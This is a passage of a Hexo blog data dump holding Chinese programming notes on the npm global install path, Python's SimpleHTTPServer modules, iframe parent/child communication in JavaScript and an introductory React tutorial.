color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","slug":"programmingLanguage/NodeJS/nodejs全局安装路径的位置","published":1,"updated":"2018-09-05T06:33:18.497Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0w00bszodvctz9lenf","content":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"简单python服务器","date":"2018-06-08T07:44:31.000Z","_content":"## Python 2.7.14 SimpleHTTPServer\n````\n'\n````\n\n这里的“Web服务器模块”有如下三种：\n\n`BaseHTTPServer`: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n\n`SimpleHTTPServer`: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n\n`CGIHTTPServer`: 包含处理POST请求和执行CGIHTTPRequestHandler类。","source":"_posts/programmingLanguage/Python/简单python服务器.md","raw":"---\ntitle: 简单python服务器\ndate: 2018-06-08 15:44:31\ntags: python SimpleHTTPServer\ncategories: Python \n---\n## Python 2.7.14 SimpleHTTPServer\n````\n'\n````\n\n这里的“Web服务器模块”有如下三种：\n\n`BaseHTTPServer`: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n\n`SimpleHTTPServer`: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n\n`CGIHTTPServer`: 包含处理POST请求和执行CGIHTTPRequestHandler类。","slug":"programmingLanguage/Python/简单python服务器","published":1,"updated":"2019-01-26T07:04:59.193Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0y00bvzodv8bhmc194","content":"<h2 id=\"Python-2-7-14-SimpleHTTPServer\"><a href=\"#Python-2-7-14-SimpleHTTPServer\" class=\"headerlink\" title=\"Python 2.7.14 SimpleHTTPServer\"></a>Python 2.7.14 SimpleHTTPServer</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;</span><br></pre></td></tr></table></figure>\n<p>这里的“Web服务器模块”有如下三种：</p>\n<p><code>BaseHTTPServer</code>: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</p>\n<p><code>SimpleHTTPServer</code>: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</p>\n<p><code>CGIHTTPServer</code>: 包含处理POST请求和执行CGIHTTPRequestHandler类。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Python-2-7-14-SimpleHTTPServer\"><a href=\"#Python-2-7-14-SimpleHTTPServer\" class=\"headerlink\" title=\"Python 2.7.14 SimpleHTTPServer\"></a>Python 2.7.14 SimpleHTTPServer</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;</span><br></pre></td></tr></table></figure>\n<p>这里的“Web服务器模块”有如下三种：</p>\n<p><code>BaseHTTPServer</code>: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</p>\n<p><code>SimpleHTTPServer</code>: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</p>\n<p><code>CGIHTTPServer</code>: 包含处理POST请求和执行CGIHTTPRequestHandler类。</p>\n"},{"title":"js之iframe父子页面通信","date":"2019-01-02T07:48:26.000Z","_content":"# [js之iframe父子页面通信](https://www.cnblogs.com/sydeveloper/p/3712863.html)\n\n父页面\n````\n/** 父页面需要在 window对象上 挂载一个 方法，供子页面调用 */\niframeHandle() {\n  window.clickSet = () => {\n    this.setState({\n      showReturn: true\n    })\n  }\n}\n\ncomponentDidMount() {\n    this.iframeHandle()\n}\n````\n\n子页面\n````\nfunction clickSet() {\n    parent.window.clickSet(); // 子页面方法内部 调用父级window对象 下挂载的方法\n}\n\n$(function(){\n    $('.iframeReturn').on('click',clickSet) // 调用方法\n})\n````\n---\n\n# [iframe在更改了src之后对应的网页并未刷新](https://blog.csdn.net/jin80506/article/details/83271401)\n\n在更改src之前加上这一句即可。\n> document.getElementById(iframe的id).contentWindow.location.reload(true);\n\n# Iframe监听ulr\n> onload标签属性\n````\n<iframe\n  id=\"AirportBusiness\"\n  src={ifSrc} frameBorder=\"0\"\n  onLoad={this.handleButton}\n  style={{ border: 0, width: clientWidth, height: clientHeight, marginTop: -70 }}\n>\n</iframe>\n\nhandleButton() {\n  let ifra = document.getElementById('AirportBusiness').contentWindow.location.href;\n  let urlTest = /index/;\n  this.setState({\n    showReturn: !urlTest.test(ifra)\n  })\n}\n````","source":"_posts/FrontEnd/JS/IFrame/js之iframe父子页面通信.md","raw":"---\ntitle: js之iframe父子页面通信\ndate: 2019-01-02 15:48:26\ntags: IFrame\ncategories: JS\n---\n# [js之iframe父子页面通信](https://www.cnblogs.com/sydeveloper/p/3712863.html)\n\n父页面\n````\n/** 父页面需要在 window对象上 挂载一个 方法，供子页面调用 */\niframeHandle() {\n  window.clickSet = () => {\n    this.setState({\n      showReturn: true\n    })\n  }\n}\n\ncomponentDidMount() {\n    this.iframeHandle()\n}\n````\n\n子页面\n````\nfunction clickSet() {\n    parent.window.clickSet(); // 子页面方法内部 调用父级window对象 下挂载的方法\n}\n\n$(function(){\n    $('.iframeReturn').on('click',clickSet) // 调用方法\n})\n````\n---\n\n# [iframe在更改了src之后对应的网页并未刷新](https://blog.csdn.net/jin80506/article/details/83271401)\n\n在更改src之前加上这一句即可。\n> document.getElementById(iframe的id).contentWindow.location.reload(true);\n\n# Iframe监听ulr\n> onload标签属性\n````\n<iframe\n  id=\"AirportBusiness\"\n  src={ifSrc} frameBorder=\"0\"\n  onLoad={this.handleButton}\n  style={{ border: 0, width: clientWidth, height: clientHeight, marginTop: -70 }}\n>\n</iframe>\n\nhandleButton() {\n  let ifra = document.getElementById('AirportBusiness').contentWindow.location.href;\n  let urlTest = /index/;\n  this.setState({\n    showReturn: !urlTest.test(ifra)\n  })\n}\n````","slug":"FrontEnd/JS/IFrame/js之iframe父子页面通信","published":1,"updated":"2019-01-02T09:46:11.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2300dkzodvos8wtoil","content":"<h1 id=\"js之iframe父子页面通信\"><a href=\"#js之iframe父子页面通信\" class=\"headerlink\" title=\"js之iframe父子页面通信\"></a><a href=\"https://www.cnblogs.com/sydeveloper/p/3712863.html\" target=\"_blank\" rel=\"noopener\">js之iframe父子页面通信</a></h1><p>父页面<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 父页面需要在 window对象上 挂载一个 方法，供子页面调用 */</span><br><span class=\"line\">iframeHandle() &#123;</span><br><span class=\"line\">  window.clickSet = () =&gt; &#123;</span><br><span class=\"line\">    this.setState(&#123;</span><br><span class=\"line\">      showReturn: true</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">componentDidMount() &#123;</span><br><span class=\"line\">    this.iframeHandle()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子页面<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function clickSet() &#123;</span><br><span class=\"line\">    parent.window.clickSet(); // 子页面方法内部 调用父级window对象 下挂载的方法</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$(function()&#123;</span><br><span class=\"line\">    $(&apos;.iframeReturn&apos;).on(&apos;click&apos;,clickSet) // 调用方法</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h1 id=\"iframe在更改了src之后对应的网页并未刷新\"><a href=\"#iframe在更改了src之后对应的网页并未刷新\" class=\"headerlink\" title=\"iframe在更改了src之后对应的网页并未刷新\"></a><a href=\"https://blog.csdn.net/jin80506/article/details/83271401\" target=\"_blank\" rel=\"noopener\">iframe在更改了src之后对应的网页并未刷新</a></h1><p>在更改src之前加上这一句即可。</p>\n<blockquote>\n<p>document.getElementById(iframe的id).contentWindow.location.reload(true);</p>\n</blockquote>\n<h1 id=\"Iframe监听ulr\"><a href=\"#Iframe监听ulr\" class=\"headerlink\" title=\"Iframe监听ulr\"></a>Iframe监听ulr</h1><blockquote>\n<p>onload标签属性<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe</span><br><span class=\"line\">  id=&quot;AirportBusiness&quot;</span><br><span class=\"line\">  src=&#123;ifSrc&#125; frameBorder=&quot;0&quot;</span><br><span class=\"line\">  onLoad=&#123;this.handleButton&#125;</span><br><span class=\"line\">  style=&#123;&#123; border: 0, width: clientWidth, height: clientHeight, marginTop: -70 &#125;&#125;</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;/iframe&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">handleButton() &#123;</span><br><span class=\"line\">  let ifra = document.getElementById(&apos;AirportBusiness&apos;).contentWindow.location.href;</span><br><span class=\"line\">  let urlTest = /index/;</span><br><span class=\"line\">  this.setState(&#123;</span><br><span class=\"line\">    showReturn: !urlTest.test(ifra)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"js之iframe父子页面通信\"><a href=\"#js之iframe父子页面通信\" class=\"headerlink\" title=\"js之iframe父子页面通信\"></a><a href=\"https://www.cnblogs.com/sydeveloper/p/3712863.html\" target=\"_blank\" rel=\"noopener\">js之iframe父子页面通信</a></h1><p>父页面<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 父页面需要在 window对象上 挂载一个 方法，供子页面调用 */</span><br><span class=\"line\">iframeHandle() &#123;</span><br><span class=\"line\">  window.clickSet = () =&gt; &#123;</span><br><span class=\"line\">    this.setState(&#123;</span><br><span class=\"line\">      showReturn: true</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">componentDidMount() &#123;</span><br><span class=\"line\">    this.iframeHandle()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子页面<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function clickSet() &#123;</span><br><span class=\"line\">    parent.window.clickSet(); // 子页面方法内部 调用父级window对象 下挂载的方法</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$(function()&#123;</span><br><span class=\"line\">    $(&apos;.iframeReturn&apos;).on(&apos;click&apos;,clickSet) // 调用方法</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h1 id=\"iframe在更改了src之后对应的网页并未刷新\"><a href=\"#iframe在更改了src之后对应的网页并未刷新\" class=\"headerlink\" title=\"iframe在更改了src之后对应的网页并未刷新\"></a><a href=\"https://blog.csdn.net/jin80506/article/details/83271401\" target=\"_blank\" rel=\"noopener\">iframe在更改了src之后对应的网页并未刷新</a></h1><p>在更改src之前加上这一句即可。</p>\n<blockquote>\n<p>document.getElementById(iframe的id).contentWindow.location.reload(true);</p>\n</blockquote>\n<h1 id=\"Iframe监听ulr\"><a href=\"#Iframe监听ulr\" class=\"headerlink\" title=\"Iframe监听ulr\"></a>Iframe监听ulr</h1><blockquote>\n<p>onload标签属性<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe</span><br><span class=\"line\">  id=&quot;AirportBusiness&quot;</span><br><span class=\"line\">  src=&#123;ifSrc&#125; frameBorder=&quot;0&quot;</span><br><span class=\"line\">  onLoad=&#123;this.handleButton&#125;</span><br><span class=\"line\">  style=&#123;&#123; border: 0, width: clientWidth, height: clientHeight, marginTop: -70 &#125;&#125;</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;/iframe&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">handleButton() &#123;</span><br><span class=\"line\">  let ifra = document.getElementById(&apos;AirportBusiness&apos;).contentWindow.location.href;</span><br><span class=\"line\">  let urlTest = /index/;</span><br><span class=\"line\">  this.setState(&#123;</span><br><span class=\"line\">    showReturn: !urlTest.test(ifra)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n"},{"title":"React-入门","date":"2017-09-13T07:21:11.000Z","archives":"Front-end","_content":"<h2>入门</h2>\n<ol>\n  <li>一个核心思想——组件化</li>\n  <li>两位带头大哥——react & react-dom</li>\n  <li>一个基本运作方式——数据驱动视图</li>\n  <li>一位神秘卧底——jsx语法</li>\n  <li>三位护法——state（状态）、props（属性）、refs（实例）</li>\n  <li>一群打杂小弟——生命周期</li>\n</ol>\n<p>\ncreate-React-app是一个全局的命令行工具用来创建一个新的项目\nreact-scripts是一个生成的项目所需要的开发依赖\n</p>\n<p>\n一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码\n</p>\n<p>\n现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖\n</p>\n<p>\n在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.\n</p>\n<p>\nWebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。\n</p>\n<h5>React-scripts有以下支持，都帮你配置好了：</h5>\n<p>React，JSX，ES6和Flow语法支持。</p>\n<p>ES6之外的语言扩展像对象扩展运算符。</p>\n<p>直接从JavaScript导入CSS和图像文件。</p>\n<p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p>\n<p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<h3>示例:</h3>\n<div>index:</div>\n    // 1.引入两位带头大哥 react和react-dom\n    import React from 'react'\n    import ReactDom from 'react-dom'\n    // 引入App组件 \n    import App from './App'\n    import logo from './logo.svg'\n    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React\n    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置\n    ReactDom.render(\n      //<div>\n        //<h1>今天学习了react</h1>\n        //<h2>这是一个h2标签</h2>\n        //<img src={logo} alt=\"\"/>\n        //<App />\n      //</div>,\n      document.getElementById('root')\n    )\n    // jsx ==== javascript +xml  神秘的卧底\n    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码\n<div>app:</div>\n    import React,{Component} from 'react'\n    import './App.css'\n    class App extends Component{\n      constructor(){\n        super()\n        console.log(this)\n        this.state = {\n          name:'焦洋',\n          time:(new Date()).toLocaleTimeString()\n        }\n        setInterval(()=>{\n          // 在react中 修改state  不能直接修改 必须通过调用this.setState()\n          // 修改我们的时间\n          // console.log(this);\n          this.setState({\n            time:(new Date()).toLocaleTimeString()\n          })\n        },1000)\n      }\n      say(){\n        return 'say Hello'\n      }\n        \n      // 引入一个打杂的小弟  生命周期 方法\n      render(){\n        // var s = 'abc'\n        // {} 插值 插槽  <%= %> 插值即可以插变量 也可以插函数\n        return (\n          <ul>\n            <li>1</li>\n            <li className='li2'>{3>4 ? '真的' : '假的'}</li>\n            <li>{this.say()}</li>\n            <li>{111}</li>\n            <li>{this.state.name}</li>\n            <li>{this.state.time}</li>\n          </ul>\n          )\n      }\n    }\n    //抛出 App\n    export default App;","source":"_posts/FrontEnd/WebFrameWork/React/React-01.md","raw":"---\ntitle: React-入门\ndate: 2017-09-13 15:21:11\ntags: React\narchives: Front-end\ncategories: 前端\n---\n<h2>入门</h2>\n<ol>\n  <li>一个核心思想——组件化</li>\n  <li>两位带头大哥——react & react-dom</li>\n  <li>一个基本运作方式——数据驱动视图</li>\n  <li>一位神秘卧底——jsx语法</li>\n  <li>三位护法——state（状态）、props（属性）、refs（实例）</li>\n  <li>一群打杂小弟——生命周期</li>\n</ol>\n<p>\ncreate-React-app是一个全局的命令行工具用来创建一个新的项目\nreact-scripts是一个生成的项目所需要的开发依赖\n</p>\n<p>\n一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码\n</p>\n<p>\n现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖\n</p>\n<p>\n在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.\n</p>\n<p>\nWebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。\n</p>\n<h5>React-scripts有以下支持，都帮你配置好了：</h5>\n<p>React，JSX，ES6和Flow语法支持。</p>\n<p>ES6之外的语言扩展像对象扩展运算符。</p>\n<p>直接从JavaScript导入CSS和图像文件。</p>\n<p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p>\n<p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<h3>示例:</h3>\n<div>index:</div>\n    // 1.引入两位带头大哥 react和react-dom\n    import React from 'react'\n    import ReactDom from 'react-dom'\n    // 引入App组件 \n    import App from './App'\n    import logo from './logo.svg'\n    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React\n    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置\n    ReactDom.render(\n      //<div>\n        //<h1>今天学习了react</h1>\n        //<h2>这是一个h2标签</h2>\n        //<img src={logo} alt=\"\"/>\n        //<App />\n      //</div>,\n      document.getElementById('root')\n    )\n    // jsx ==== javascript +xml  神秘的卧底\n    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码\n<div>app:</div>\n    import React,{Component} from 'react'\n    import './App.css'\n    class App extends Component{\n      constructor(){\n        super()\n        console.log(this)\n        this.state = {\n          name:'焦洋',\n          time:(new Date()).toLocaleTimeString()\n        }\n        setInterval(()=>{\n          // 在react中 修改state  不能直接修改 必须通过调用this.setState()\n          // 修改我们的时间\n          // console.log(this);\n          this.setState({\n            time:(new Date()).toLocaleTimeString()\n          })\n        },1000)\n      }\n      say(){\n        return 'say Hello'\n      }\n        \n      // 引入一个打杂的小弟  生命周期 方法\n      render(){\n        // var s = 'abc'\n        // {} 插值 插槽  <%= %> 插值即可以插变量 也可以插函数\n        return (\n          <ul>\n            <li>1</li>\n            <li className='li2'>{3>4 ? '真的' : '假的'}</li>\n            <li>{this.say()}</li>\n            <li>{111}</li>\n            <li>{this.state.name}</li>\n            <li>{this.state.time}</li>\n          </ul>\n          )\n      }\n    }\n    //抛出 App\n    export default App;","slug":"FrontEnd/WebFrameWork/React/React-01","published":1,"updated":"2018-09-05T06:33:18.479Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2400dlzodv7cp67oyf","content":"<p></p><h2>入门</h2><p></p>\n<p><ol><br>  <li>一个核心思想——组件化</li><br>  <li>两位带头大哥——react &amp; react-dom</li><br>  <li>一个基本运作方式——数据驱动视图</li><br>  <li>一位神秘卧底——jsx语法</li><br>  <li>三位护法——state（状态）、props（属性）、refs（实例）</li><br>  <li>一群打杂小弟——生命周期</li><br></ol></p>\n<p><br>create-React-app是一个全局的命令行工具用来创建一个新的项目<br>react-scripts是一个生成的项目所需要的开发依赖<br></p><br><p><br>一般我们开始创建react应用程序的时候，要自己通过npm或者安装项目的全部依赖，再写webpack.config.js，一系列复杂的配置，搭建好开发环境后写src源代码<br></p><br><p><br>现在如果你正在搭建react运行环境，使用create-react-app去自动构建你的程序。你的项目所在的文件夹下是没有配置文件的。react-scripts是唯一的额外的构造依赖<br></p><br><p><br>在你的package.json中，你的运行环境将有每一个你需要用来构建一个现代应用程序所需要的依赖，在配置文件中编写的配置代码，React脚本都帮你写了，比如：react-scripts帮你自动下载需要的webpack-dev-server依赖，然后react脚本自己写了一个nodejs服务端的脚本代码start.js来实例化.<br></p><br><p><br>WebpackDevServer，并且运行启动了一个使用express的Http服务器，现在你只需要专心写SRC源代码就可以了。省去了很多精力，最适合快速上手一个演示了。<br></p><br><h5>React-scripts有以下支持，都帮你配置好了：</h5><br><p>React，JSX，ES6和Flow语法支持。</p><br><p>ES6之外的语言扩展像对象扩展运算符。</p><br><p>直接从JavaScript导入CSS和图像文件。</p><br><p>自动翻译CSS，所以你不需要-webkit或其他前缀。</p><br><p>一个构建脚本来捆绑JS，CSS，和图像进行生产，具有源代码图。</p>\n\n<p></p><h3>示例:</h3><p></p>\n<p><div>index:</div><br>    // 1.引入两位带头大哥 react和react-dom<br>    import React from ‘react’<br>    import ReactDom from ‘react-dom’<br>    // 引入App组件<br>    import App from ‘./App’<br>    import logo from ‘./logo.svg’<br>    // ReactDom负责控制页面的内容 但是使用ReactDom 必须依赖React<br>    // 第一个参数 是渲染的元素(必须是闭合标签)  第二个参数是渲染的位置<br>    ReactDom.render(<br>      //<div><br>        //<h1>今天学习了react</h1><br>        //<h2>这是一个h2标签</h2><br>        //<img src=\"{logo}\" alt=\"\"><br>        //<app><br>      //</app></div>,<br>      document.getElementById(‘root’)<br>    )<br>    // jsx ==== javascript +xml  神秘的卧底<br>    // 可以在js语言中 插入 xml(html)语言  语法糖  每一个XML标签都会被JSX转换工具转换成纯Javascript代码</p>\n<p><div>app:</div><br>    import React,{Component} from ‘react’<br>    import ‘./App.css’<br>    class App extends Component{<br>      constructor(){<br>        super()<br>        console.log(this)<br>        this.state = {<br>          name:’焦洋’,<br>          time:(new Date()).toLocaleTimeString()<br>        }<br>        setInterval(()=&gt;{<br>          // 在react中 修改state  不能直接修改 必须通过调用this.setState()<br>          // 修改我们的时间<br>          // console.log(this);<br>          this.setState({<br>            time:(new Date()).toLocaleTimeString()<br>          })<br>        },1000)<br>      }<br>      say(){<br>        return ‘say Hello’<br>      }</p>\n<pre><code>  // 引入一个打杂的小弟  生命周期 方法\n  render(){\n    // var s = &apos;abc&apos;\n    // {} 插值 插槽  &lt;%= %&gt; 插值即可以插变量 也可以插函数\n    return (\n      &lt;ul&gt;\n        &lt;li&gt;1&lt;/li&gt;\n        &lt;li className=&apos;li2&apos;&gt;{3&gt;4 ? &apos;真的&apos; : &apos;假的&apos;}&lt;/li&gt;\n        &lt;li&gt;{this.say()}&lt;/li&gt;\n        &lt;li&gt;{111}&lt;/li&gt;\n        &lt;li&gt;{this.state.name}&lt;/li&gt;\n        